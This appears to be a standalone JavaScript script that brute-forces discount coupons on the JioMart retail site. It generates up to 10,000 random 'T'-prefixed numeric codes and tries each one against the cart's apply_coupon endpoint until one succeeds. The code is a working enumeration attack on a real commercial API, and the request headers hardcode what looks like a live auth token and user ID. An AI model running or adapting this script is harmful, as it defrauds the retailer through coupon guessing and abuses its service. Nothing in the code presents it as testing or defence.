function makeid(length) {
    var result           = '';
    var characters       = '0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}


import axios from 'axios'
async function mycheck(){
    for(let i=0;i<10000;i++){
        let coupon = `T${makeid(11)}`
   console.log(coupon)
   try{
    let {data}=await axios.get(`https://www.jiomart.com/mst/rest/v1/cart/apply_coupon?coupon_code=${coupon}`,{
        headers: { 
           'authtoken': '1eba29a70ca71293fd0ec75f9f674c9d70351699-1818061942', 
             'pin': '400020', 
        'userid': '49196785'
          }
        });
        console.log(data.status,i)
        if(data.status && data.status =="success"){
            console.log("coupon here",coupon,)
            break;
        }
   }catch(error){
       console.log("error",i, error.response.data && error.response.data.reason && error.response.data.reason.reason_eng ? error.response.data.reason.reason_eng : "error")
   }
    }
   return "done"
}

mycheck();





















